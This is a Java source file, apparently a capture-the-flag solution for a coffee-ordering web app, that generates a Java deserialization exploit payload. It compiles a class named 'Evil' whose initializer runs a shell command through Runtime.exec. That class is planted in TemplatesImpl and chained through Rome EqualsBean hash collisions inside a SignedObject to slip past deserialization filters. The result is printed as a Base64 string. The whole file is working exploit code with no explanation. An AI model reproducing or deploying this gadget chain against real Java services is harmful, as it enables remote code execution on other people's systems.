import com.example.b4bycoffee.model.CoffeeRequest;
import com.rometools.rome.feed.impl.EqualsBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.json.JSONObject;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;

public class test {

    public static void setFieldValue(Object target, String name, Object value) throws Exception {
        Class c = target.getClass();
        Field field = c.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }

    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody(" try {\n" +
                    " Runtime.getRuntime().exec(\"" + cmd +
                    "\");\n" +
                    " } catch (Exception ignored) {\n" +
                    " }");
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }
    public static void main(String[] args) throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        byte[] code = getTemplatesImpl("Calc");
        byte[][] bytecodes = {code};
        setFieldValue(obj, "_bytecodes", bytecodes);
        setFieldValue(obj, "_name", "Poria");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Hashtable table1 = getPayload(Templates.class, obj);
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(table1, kp.getPrivate(), Signature.getInstance("DSA"));
        Hashtable table2 = getPayload(SignedObject.class, signedObject);


        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(table2);
        oos.close();
        String payload = new String(Base64.getEncoder().encode(baos.toByteArray()));
        System.out.println(payload);

        
    }


    public static Hashtable getPayload (Class clazz, Object payloadObj) throws Exception{
        EqualsBean bean = new EqualsBean(String.class, "r");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", bean);
        map1.put("zZ", payloadObj);
        map2.put("zZ", bean);
        map2.put("yy", payloadObj);
        Hashtable table = new Hashtable();
        table.put(map1, "1");
        table.put(map2, "2");
        setFieldValue(bean, "beanClass", clazz);
        setFieldValue(bean, "obj", payloadObj);
        return table;
    }
}
